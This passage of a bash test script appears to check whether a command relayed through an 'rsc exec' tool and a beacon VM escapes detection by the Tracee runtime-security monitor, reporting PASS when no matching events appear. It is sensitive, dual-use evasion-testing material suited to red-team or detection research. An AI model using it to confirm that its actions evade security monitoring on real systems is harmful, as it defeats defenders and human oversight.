	BEACON_IP_SSH=$(ssh "$BEACON_VM" "hostname -I | awk '{print \$1}'" 2>/dev/null)
fi

say "Cleaning stale mounts on $REMOTE"
ssh "$REMOTE" "mkdir -p '$MOUNT_BASE'; \
    for p in \$(pgrep -f '$NAME'); do [ \"\$p\" != \"\$\$\" ] && sudo kill -9 \"\$p\" 2>/dev/null || true; done; sleep 0.4; \
    grep -qF '$MOUNT_POINT' /proc/mounts && sudo umount -l '$MOUNT_POINT' 2>/dev/null || true; \
    sudo rm -rf '$MOUNT_POINT' 2>/dev/null || true"

# ── Step 4: Run command via rsc exec ────────────────────────────────────────
say "Running: sudo rsc exec --mount-profile $PROFILE -- $CMD"
echo ""
echo "─── stdout ──────────────────────────────────────────────────────────────"
set +e
ssh "$REMOTE" \
	"sudo RUST_LOG=${RUST_LOG:-info} $RSC exec \
        --beacon '${BEACON_IP_SSH}:${BEACON_PORT}' \
        --rsclient '$RSCLIENT' \
        --mount-base '$MOUNT_BASE' \
        --name '$NAME' \
        --mount-profile '$PROFILE' \
        $RSC_EXTRA_ARGS \
        -- $CMD" 2>&1 | grep -v 'Guest agent is not responding\|Domain not found' | head -n 20
EXIT_CODE=${PIPESTATUS[0]}
set -e
echo "─────────────────────────────────────────────────────────────────────────"
echo ""
info "exit code: $EXIT_CODE"

# ── Step 5: Cleanup rscfuse ─────────────────────────────────────────────────
ssh "$REMOTE" \
	"for p in \$(pgrep -f '$NAME'); do [ \"\$p\" != \"\$\$\" ] && sudo kill -9 \"\$p\" 2>/dev/null || true; done; sleep 0.4; \
     grep -qF '$MOUNT_POINT' /proc/mounts && sudo umount -l '$MOUNT_POINT' 2>/dev/null || true; \
     sudo rm -rf '$MOUNT_POINT' 2>/dev/null || true" 2>/dev/null

# ── Step 6: Print tracee events for the evasion run ─────────────────────────
EVASION_COUNT=""
if [[ "$NO_TRACEE" -eq 0 ]]; then
	say "Evasion tracee events from $BEACON_VM"
	info "events: ${TRACEE_EVENTS}${QUERY:+   query: $QUERY}"
	echo ""
	stop_tracee_and_filter
	EVASION_COUNT="$LAST_EVENT_COUNT"
	echo ""
fi

# ── Step 7: Best-effort cleanup command (both hosts) ────────────────────────
if [[ -n "$CLEANUP_CMD" ]]; then
	say "Cleanup: $CLEANUP_CMD"
	run_remote "$BEACON_VM" "$CLEANUP_CMD" 2>/dev/null || true
	run_remote "$REMOTE" "$CLEANUP_CMD" 2>/dev/null || true
fi

# ── Summary ──────────────────────────────────────────────────────────────────
# A non-zero evasion run means the payload never executed (broken binary,
# missing lib, crashed relay...) — zero tracee events in that state says
# nothing about evasion. Fail loudly instead of reporting a vacuous PASS.
if [[ "$EXIT_CODE" -ne 0 ]]; then
	say "Comparison (matching events on $BEACON_VM)"
	echo "${red}FAIL${reset} — evasion command itself exited $EXIT_CODE; event counts are meaningless."
	exit 1
fi
if [[ "$COMPARE" -eq 1 && -n "$BASELINE_COUNT" ]]; then
	say "Comparison (matching events on $BEACON_VM)"
	echo "  baseline (no evasion): ${yellow}${BASELINE_COUNT}${reset} event(s)"
	echo "  evasion  (via rscaller): ${yellow}${EVASION_COUNT}${reset} event(s)"
	echo ""
	if [[ "$BASELINE_COUNT" -eq 0 ]]; then
		echo "${yellow}WARN${reset} baseline saw 0 events — tracee hooks may be inactive; result is meaningless."
		exit 1
	elif [[ "$EVASION_COUNT" -eq 0 ]]; then
		echo "${green}PASS${reset} — evasion confirmed: 0 matching events on $BEACON_VM during rscaller run."
	else
		echo "${red}FAIL${reset} — evasion run still produced ${EVASION_COUNT} matching event(s) on $BEACON_VM."
		exit 1
	fi
else
	say "Done (exit=$EXIT_CODE)"
	if [[ "$EXIT_CODE" -eq 0 ]]; then
		echo "${green}PASS${reset}"
	else
		echo "${red}FAIL${reset}"
		exit 1
	fi
fi
